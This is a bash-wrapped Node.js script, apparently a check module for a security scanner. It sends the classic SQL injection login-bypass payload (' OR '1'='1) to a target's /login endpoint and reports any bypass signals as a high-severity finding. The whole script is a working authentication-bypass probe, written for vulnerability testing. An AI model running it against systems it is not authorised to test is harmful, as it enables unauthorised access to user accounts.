#!/usr/bin/env bash
set -euo pipefail
payload="$(cat)"
SEED_PAYLOAD="$payload" node <<'NODE'
const http = require("node:http");
const https = require("node:https");

const payload = JSON.parse(process.env.SEED_PAYLOAD || "{}");
const toolInput = payload?.request?.parameters?.toolInput ?? {};
const baseUrl = String(toolInput.baseUrl || `http://${toolInput.target || payload?.request?.target || "localhost"}`);
const loginUrl = new URL("/login", baseUrl).toString();
const body = "username=%27%20OR%20%271%27%3D%271&password=test";

function submit(targetUrl, requestBody) {
  return new Promise((resolve) => {
    const url = new URL(targetUrl);
    const transport = url.protocol === "https:" ? https : http;
    const req = transport.request(url, {
      method: 'POST',
      timeout: 2000,
      headers: {
        'content-type': 'application/x-www-form-urlencoded',
        'content-length': Buffer.byteLength(requestBody)
      }
    }, (res) => {
      let responseBody = "";
      res.setEncoding("utf8");
      res.on("data", (chunk) => { if (responseBody.length < 16384) { responseBody += chunk; } });
      res.on("end", () => resolve({ url: url.toString(), statusCode: res.statusCode ?? 0, body: responseBody }));
    });
    req.on("timeout", () => req.destroy(new Error("request timed out")));
    req.on("error", (error) => resolve({ url: url.toString(), statusCode: 0, body: error.message, error: error.message }));
    req.write(requestBody);
    req.end();
  });
}

(async () => {
  const result = await submit(loginUrl, body);
  if (result.statusCode === 0) {
    console.log(JSON.stringify({
      output: `SQL injection check could not reach ${loginUrl}: ${result.body}`,
      statusReason: "Login endpoint was unreachable during SQL injection check"
    }));
    process.exit(64);
  }
  const indicators = [/Authentication bypassed via SQL injection/i, /"success"\s*:\s*true/i, /SELECT \* FROM users/i, /"user"\s*:\s*\{/i];
  const matched = indicators.filter((indicator) => indicator.test(result.body));
  const observations = matched.length > 0 ? [{
    key: "sqli:/login",
    title: "Login endpoint appears injectable with a classic quote payload",
    summary: "/login accepted a quote-based payload and returned an authentication bypass signal.",
    severity: "high",
    confidence: 0.97,
    evidence: `URL: ${result.url}\nStatus: ${result.statusCode}\nPayload: username=' OR '1'='1\nSnippet: ${result.body.slice(0, 320)}`,
    technique: "seeded SQL injection check"
  }] : [];
  const output = observations.length > 0
    ? `HIGH ${observations[0].title}`
    : `No SQL injection bypass signal was confirmed at ${loginUrl}. Status=${result.statusCode}.`;
  console.log(JSON.stringify({
    output,
    observations,
    commandPreview: `seed-sql-injection-check url=${loginUrl}`
  }));
})().catch((error) => {
  console.log(JSON.stringify({
    output: `SQL injection check failed: ${error.message}`,
    statusReason: error.message
  }));
  process.exit(1);
});
NODE
